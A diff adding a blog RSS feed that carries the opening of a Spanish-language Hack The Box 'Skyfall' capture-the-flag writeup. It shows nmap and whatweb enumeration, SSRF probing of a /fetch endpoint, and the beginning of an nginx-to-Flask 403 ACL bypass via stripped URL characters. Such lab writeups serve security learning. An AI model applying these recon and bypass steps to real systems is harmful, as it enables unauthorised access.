@@ -1,0 +1,1125 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Bajo el Teclado</title>
+    <link>http://localhost:1313/tags/bypass-unix-permissions/</link>
+    <description>Recent content on Bajo el Teclado</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>es</language>
+    <managingEditor>adelcerrorodriguez@gmail.com (Andrés Del Cerro)</managingEditor>
+    <webMaster>adelcerrorodriguez@gmail.com (Andrés Del Cerro)</webMaster>
+    <copyright>© 2024 pointedsec</copyright>
+    <lastBuildDate>Thu, 05 Sep 2024 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/bypass-unix-permissions/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Hack The Box: Skyfall Writeup | Insane</title>
+      <link>http://localhost:1313/writeups/skyfall---hackthebox/</link>
+      <pubDate>Thu, 05 Sep 2024 00:00:00 +0000</pubDate><author>adelcerrorodriguez@gmail.com (Andrés Del Cerro)</author>
+      <guid>http://localhost:1313/writeups/skyfall---hackthebox/</guid>
+      <description>&lt;h1 id=&#34;hack-the-box-skyfall-writeup&#34;&gt;Hack The Box: Skyfall Writeup&lt;/h1&gt;
+&lt;p&gt;Welcome to my detailed writeup of the insane difficulty machine &lt;strong&gt;&amp;ldquo;Skyfall&amp;rdquo;&lt;/strong&gt; on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.&lt;/p&gt;
+&lt;h1 id=&#34;tcp-enumeration&#34;&gt;TCP Enumeration&lt;/h1&gt;
+
+
+
+
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;1&lt;/span&gt;&lt;span&gt;$ rustscan -a 10.129.230.158 --ulimit &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;5000&lt;/span&gt; -g
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;2&lt;/span&gt;&lt;span&gt;10.129.230.158 -&amp;gt; [22,80]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+
+
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 1&lt;/span&gt;&lt;span&gt;$ nmap -p22,80 -sCV 10.129.230.158 -oN allPorts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 2&lt;/span&gt;&lt;span&gt;Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 19:59 CEST
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 3&lt;/span&gt;&lt;span&gt;Nmap scan report for 10.129.230.158
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 4&lt;/span&gt;&lt;span&gt;Host is up (0.036s latency).
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 5&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#f00&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 6&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#f00&#34;&gt;&lt;/span&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 7&lt;/span&gt;&lt;span&gt;22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 8&lt;/span&gt;&lt;span&gt;| ssh-hostkey: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 9&lt;/span&gt;&lt;span&gt;|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;10&lt;/span&gt;&lt;span&gt;|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;11&lt;/span&gt;&lt;span&gt;80/tcp open  http    nginx 1.18.0 (Ubuntu)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;12&lt;/span&gt;&lt;span&gt;|_http-title: Skyfall - Introducing Sky Storage!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;13&lt;/span&gt;&lt;span&gt;|_http-server-header: nginx/1.18.0 (Ubuntu)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;14&lt;/span&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;15&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#f00&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;16&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#f00&#34;&gt;&lt;/span&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;17&lt;/span&gt;&lt;span&gt;Nmap done: 1 IP address (1 host up) scanned in 9.97 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h1 id=&#34;udp-enumeration&#34;&gt;UDP Enumeration&lt;/h1&gt;
+
+
+
+
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 1&lt;/span&gt;&lt;span&gt;$ sudo nmap --top-ports &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;1500&lt;/span&gt; -sU --min-rate &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;5000&lt;/span&gt; -n -Pn 10.129.230.158 -oN allPorts.UDP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 2&lt;/span&gt;&lt;span&gt;Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 19:59 CEST
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 3&lt;/span&gt;&lt;span&gt;Nmap scan report for 10.129.230.158
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 4&lt;/span&gt;&lt;span&gt;Host is up (0.036s latency).
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 5&lt;/span&gt;&lt;span&gt;Not shown: 1495 open|filtered udp ports (no-response)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 6&lt;/span&gt;&lt;span&gt;PORT      STATE  SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 7&lt;/span&gt;&lt;span&gt;69/udp    closed tftp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 8&lt;/span&gt;&lt;span&gt;6346/udp  closed gnutella
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 9&lt;/span&gt;&lt;span&gt;18617/udp closed unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;10&lt;/span&gt;&lt;span&gt;20423/udp closed unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;11&lt;/span&gt;&lt;span&gt;27195/udp closed unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;12&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#f00&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;13&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#f00&#34;&gt;&lt;/span&gt;Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h1 id=&#34;http-enumeration&#34;&gt;HTTP Enumeration&lt;/h1&gt;
+&lt;p&gt;Solo encontramos el servicio web como posible punto de entrada de la máquina.
+&lt;code&gt;whatweb&lt;/code&gt;nos reporta varias cosas interesantes.&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h1 id="hack-the-box-skyfall-writeup">Hack The Box: Skyfall Writeup</h1>
+<p>Welcome to my detailed writeup of the insane difficulty machine <strong>&ldquo;Skyfall&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h1 id="tcp-enumeration">TCP Enumeration</h1>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ rustscan -a 10.129.230.158 --ulimit <span style="color:#ff0;font-weight:bold">5000</span> -g
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>10.129.230.158 -&gt; [22,80]
+</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ nmap -p22,80 -sCV 10.129.230.158 -oN allPorts
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 19:59 CEST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report for 10.129.230.158
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.036s latency).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span><span style="color:#f00"></span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>|_http-title: Skyfall - Introducing Sky Storage!
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span><span style="color:#f00"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>Nmap done: 1 IP address (1 host up) scanned in 9.97 seconds
+</span></span></code></pre></div>
+<h1 id="udp-enumeration">UDP Enumeration</h1>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ sudo nmap --top-ports <span style="color:#ff0;font-weight:bold">1500</span> -sU --min-rate <span style="color:#ff0;font-weight:bold">5000</span> -n -Pn 10.129.230.158 -oN allPorts.UDP
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 19:59 CEST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report for 10.129.230.158
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.036s latency).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Not shown: 1495 open|filtered udp ports (no-response)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>PORT      STATE  SERVICE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>69/udp    closed tftp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>6346/udp  closed gnutella
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>18617/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>20423/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>27195/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span><span style="color:#f00"></span>Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds
+</span></span></code></pre></div>
+<h1 id="http-enumeration">HTTP Enumeration</h1>
+<p>Solo encontramos el servicio web como posible punto de entrada de la máquina.
+<code>whatweb</code>nos reporta varias cosas interesantes.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ whatweb http://10.129.230.158
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>http://10.129.230.158 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[askyy@skyfall.htb,btanner@skyfall.htb,contact@skyfall.com,jbond@skyfall.htb], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.230.158], Lightbox, Script, Title[Skyfall - Introducing Sky Storage!], nginx[1.18.0]
+</span></span></code></pre></div>
+<p>Vemos varios correos electrónicos.</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>askyy@skyfall.htb,btanner@skyfall.htb,contact@skyfall.com,jbond@skyfall.htb</code></pre>
+<p>Vamos a añadir el dominio <code>skyfall.htb</code> al <code>/etc/hosts</code></p>
+<p>Y vamos a hacer una pequeña lista de usuarios por si nos sirve en un futuro.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ cat users.txt 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>askyy
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>btanner
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>contact
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>jbond
+</span></span></code></pre></div>
+<p>Así se ve el sitio web.
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+<p>Vemos el subdominio <code>demo.skyfall.htb</code>
+<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+<p>Se nos incluye unas credenciales de acceso, <code>guest:guest</code>
+<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
+<p>Leyendo las tareas podemos deducir que existe un S3 por detrás para almacenamiento y que debe de haber una instancia de Minio.
+<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
+<p>En el apartado <code>Files</code> podemos descargar un archivo. <code>Welcome.pdf</code></p>
+<p>Si cambiamos el link de descarga por un archivo que no exista vemos un error de S3.
+<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
+<p>Vemos varios sitios restringidos, <code>/beta</code>, <code>/metrics</code>.
+<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
+<p>Existe una función en <code>/fetch</code> para &ldquo;descargar&rdquo; el contenido de un sitio web.</p>
+<p>Al probar una traza hacia mi equipo vemos que llega.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span> python3 -m http.server 8081
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>10.129.230.158 - - [05/Sep/2024 20:12:09] &#34;GET / HTTP/1.1&#34; 200 -
+</span></span></code></pre></div>
+<p>Al intentar un SSRF no consigue realizar la conexión.
+<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
+<p>Me di cuenta de que se reflejaba el nombre del host al que está intentando conectarse, al ver que la aplicación estaba hecha en Flask intenté realizar un SSTI pero fue fallido.</p>
+<p>Vemos varios formularios pero tras intentar inyectar una imagen de nuestro servidor para ver si se acontece un XSS no conseguimos nada.</p>
+<h2 id="bypassing-403---exploiting-http-parser-inconsistencies">Bypassing 403 -&gt; Exploiting HTTP Parser Inconsistencies</h2>
+<p>Viendo el mensaje de 403 Forbidden, no es un mensaje personalizado como puede ser el 404 Not Found. Es el mensaje de <code>nginx</code>, esto significa que esta restricción se debe de estar haciendo a nivel de Proxy seguramente.
+<img src="images/Screenshot_8.png" alt="Write-up Image">
+<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
+<p>Podemos ver <a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies">este post</a> que encontré en HackTricks donde en el apartado <code>Bypassing Nginx ACL Rules With Flask</code> encontramos algo muy curioso.</p>
+<blockquote>
+<p>Flask removes the characters \x85, \xA0, \x1F, \x1E, \x1D, \x1C, \x0C, \x0B, and \x09 from the URL path, but NGINX doesn&rsquo;t.</p>
+</blockquote>
+<p>Esto significa que si en <code>nginx</code> tenemos una configuración como la siguiente</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>location = /admin {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>    deny all;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span><span style="color:#f00"></span>location = /admin/ {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>    deny all;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>}
+</span></span></code></pre></div>
+<p>Y en nuestro servidor flask tenemos el endpoint abierto, es decir, que nos fiamos de <code>nginx</code> al 100%.</p>
+
+
+
+
+
+
